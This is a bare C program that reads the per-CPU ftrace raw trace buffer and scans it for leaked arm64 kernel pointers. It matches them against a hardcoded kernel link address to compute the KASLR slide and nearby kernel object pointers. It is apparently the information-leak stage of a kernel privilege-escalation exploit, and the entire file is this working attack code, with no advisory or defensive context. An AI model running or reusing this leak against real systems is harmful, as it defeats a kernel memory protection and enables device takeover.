#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define TRACE "/sys/kernel/tracing"
#define LINK_SITE 0xffffffc0803718f4ULL
int main(int argc, char **argv)
{
	const char *cpu = argc > 1 ? argv[1] : "0";
	char path[128];
	snprintf(path, sizeof path, TRACE "/per_cpu/cpu%s/trace_pipe_raw", cpu);
	int fd = open(path, O_RDONLY | O_CLOEXEC | O_NONBLOCK);
	if (fd < 0)
	{
		printf("open errno=%d\n", errno);
		return 1;
	}
	static uint8_t buf[1 << 21];
	size_t used = 0;
	for (int i = 0; i < 300 && used < sizeof(buf); i++)
	{
		ssize_t n = read(fd, buf + used, sizeof(buf) - used);
		if (n <= 0)
		{
			if (errno == EAGAIN)
			{
				usleep(10000);
				continue;
			}
			break;
		}
		used += n;
	}
	close(fd);
	printf("raw=%zu\n", used);
	int found = 0;
	for (size_t i = 0; i + 32 <= used; i++)
	{
		uint64_t v, p, req;
		memcpy(&v, buf + i, 8);
		if ((v >> 48) != 0xffffULL)
			continue;
		if ((v & 0x1fffffULL) != (LINK_SITE & 0x1fffffULL))
			continue;
		uint64_t slide = v - LINK_SITE;
		if (slide > 0x40000000ULL || (slide & 0x1fffffULL))
			continue;
		memcpy(&p, buf + i + 8, 8);
		memcpy(&req, buf + i + 16, 8);
		printf("cand off=0x%zx site=0x%llx slide=0x%llx ptr=0x%llx req=0x%llx\n",
			   i, (unsigned long long)v, (unsigned long long)slide,
			   (unsigned long long)p, (unsigned long long)req);
		if ((p >> 48) == 0xffffULL && !(p & 7) && req == 0x100)
			found++;
	}
	printf("found=%d\n", found);
	return 0;
}
